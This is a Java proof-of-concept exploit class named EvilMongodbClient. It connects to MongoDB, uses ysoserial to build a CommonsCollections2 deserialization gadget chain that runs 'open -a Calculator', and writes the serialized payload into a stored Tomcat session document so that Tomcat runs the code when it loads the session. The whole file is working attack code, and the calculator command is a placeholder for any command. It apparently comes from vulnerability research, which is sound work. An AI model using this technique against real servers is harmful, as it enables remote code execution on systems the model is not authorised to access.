package com.nosqlclient.tomcat;

import com.mongodb.BasicDBObject;
import com.mongodb.MongoClient;
import com.mongodb.client.ListCollectionsIterable;
import com.mongodb.client.MongoDatabase;
import org.bson.Document;
import org.bson.types.ObjectId;
import ysoserial.payloads.ObjectPayload;


public class EvilMongodbClient {

    public static void main(String[] args) {

        MongoClient client = new MongoClient("localhost", 27017);

        MongoDatabase db = client.getDatabase("tomcat_sessions");

        ListCollectionsIterable<Document> collections = db.listCollections();

            Object payloadObject = ObjectPayload.Utils.makePayloadObject("CommonsCollections2", "open -a Calculator");

            byte[] SerialData = SerializeUtil.serialize(payloadObject);

            db.getCollection("tomcat.sessions").updateOne(
                    new BasicDBObject("_id", new ObjectId("5ec96c9a2a3cd7a39bc36901")),
                    new BasicDBObject("$set", new BasicDBObject("data", SerialData)));
        }
}
